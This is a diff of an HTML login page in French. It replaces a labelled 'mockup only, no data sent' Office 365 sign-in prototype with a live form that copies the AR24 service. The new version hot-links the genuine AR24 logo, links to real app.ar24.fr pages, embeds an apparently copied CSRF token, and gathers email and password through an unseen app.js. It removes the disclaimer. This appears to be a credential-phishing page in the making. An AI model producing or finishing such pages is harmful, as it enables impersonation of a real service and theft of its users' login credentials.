@@ -2,29 +2,186 @@
 <html lang="fr">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Maquette Office 365 - Connexion</title>
-    <link rel="stylesheet" href="css/office365-mockup.css" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Connexion - Mon application</title>
+    <style>
+      *{
+          padding: 0;
+          margin: 0;
+          box-sizing: border-box;
+          font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      }
+
+
+      .container{
+          width: 100%;
+          height: 100vh;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          background-color: #d4e0d1;
+
+
+      }
+
+      .hero-section{
+          width: 440px;
+          height: 350px;
+          padding: 40px;
+          background-color: #ffffff;
+          border-radius: 2px;
+          box-shadow: 1px 1px 4px 0px rgba(0,0,0,0.75);
+
+      }
+      .hero-section img{
+          height: 24px;
+      }
+
+      .hero-section h3{
+          color: #1b1b1b;
+          font-weight: 500;
+          font-size: 24px;
+          margin-top: 10px;
+      }
+
+      .hero-section input{
+          width: 100%;
+          height: 45px;
+          margin-top: 10px;
+          border: none;
+          font-size: 15px;
+          border-bottom: 1px solid black;
+      }
+
+      input:focus{
+          outline: none;
+      }
+
+      .hero-section p{
+          font-size: 13px;
+          font-weight: 400;
+          margin-top: 20px;
+      }
+
+      .hero-section a{
+          text-decoration: none;
+          color: #0067b8;
+      }
+
+      .hero-section a:hover{
+          text-decoration: underline;
+          color: #1b1b1b;
+      }
+      .btn{
+          display: flex;
+          align-items: center;
+          justify-content: flex-end;
+          margin-top: 25px;
+
+      }
+
+      .back-btn{
+          width: 100px;
+          height: 30px;
+          border: none;
+          font-weight: 500;
+          margin-right: 5px;
+          background-color: #cccccc;
+      }
+
+      .new-btn{
+          width: 100px;
+          height: 30px;
+          font-weight: 500;
+          background-color: #0067b8;
+          border: none;
+          color: white;
+      }
+
+      .sign-in-option{
+          width: 440px;
+          font-weight: 400;
+          height: 50px;
+          background-color: white;
+          margin-top: 20px;
+          display: flex;
+          align-items: center;
+          padding-left: 40px;
+          box-shadow: 1px 1px 4px 0px rgba(0,0,0,0.75);
+          border-radius: 2px;
+      }
+
+      .sign-in-option:hover{
+          background-color: #d4e0d1;
+      }
+
+
+
+      @media (max-width:600px){
+
+          .container{
+              display: flex;
+              justify-content: start;
+              background-color: white;
+
+
+          }
+
+          .hero-section{
+              width: 100%;
+              box-shadow: none;
+
+          }
+
+          .sign-in-option{
+              margin: 0px;
+              border: .5px solid gray;
+              box-shadow: none;
+          }
+
+      }
+</style>
   </head>
   <body>
-    <header class="header">
-      <div class="brand">Connexion Microsoft 365 — Maquette</div>
-      <a class="btn btn-secondary" href="index.html">Accueil</a>
-    </header>
-    <main class="main">
-      <section class="hero form-wrap">
-        <h1>Se connecter</h1>
-        <p>Prototype visuel de l’écran de connexion.</p>
-        <label class="label" for="email">Adresse e-mail professionnelle</label>
-        <input class="input" id="email" type="email" placeholder="prenom.nom@entreprise.com" />
-        <label class="label" for="pwd">Mot de passe</label>
-        <input class="input" id="pwd" type="password" placeholder="••••••••" />
-        <div class="links">
-          <a class="btn btn-primary" href="verification.html">Continuer</a>
-          <a class="btn btn-secondary" href="register.html">Créer un compte</a>
-        </div>
-        <div class="notice">Note: maquette UI uniquement, aucun envoi de données.</div>
-      </section>
-    </main>
+    <div class="container">
+      <div class="hero-section">
+        <img src="https://app.ar24.fr/static/images/logo/AR24.svg" alt="Logo" />
+        <h3>Connexion</h3>
+
+        <form id="login">
+          <input
+            type="hidden"
+            name="csrf_token"
+            value="eyJ0aW1lc3RhbXAiOjE3NzIyMjE5NzgsIm5vbmNlIjoiNTZmMjg5YTY5ZDlmNTM3ODg3NDhlNWMyNzI4MjZhNTdkNTIzZTY2YjA2YjQ4NDgzZjg2NWFhMWFjMTVhNjVmYyJ92_BFCRJiSxc5eUBk166nEKpo2nTO6a6nzRPg1mbEkok"
+          />
+          <input type="email" id="ide_id" name="ide" placeholder="Adresse e-mail" required autocomplete="username" />
+          <input
+            class="password"
+            type="password"
+            id="pwd_id"
+            name="pwd"
+            autocomplete="current-password"
+            placeholder="Mot de passe"
+            required
+          />
+
+          <p>Pas de compte ? <a href="https://app.ar24.fr/fr/user/register">Créer un compte</a></p>
+          <p><a href="https://app.ar24.fr/fr/page/forgot">Mot de passe oublié ?</a></p>
+
+          <span class="btn">
+            <button class="back-btn" type="button" onclick="window.location.href='index.html'">Retour</button>
+            <button class="new-btn" type="submit">Connexion</button>
+          </span>
+        </form>
+      </div>
+
+      <div class="sign-in-option">
+        <p>Autres options de connexion</p>
+      </div>
+    </div>
+
+    <script src="app.js"></script>
   </body>
 </html>
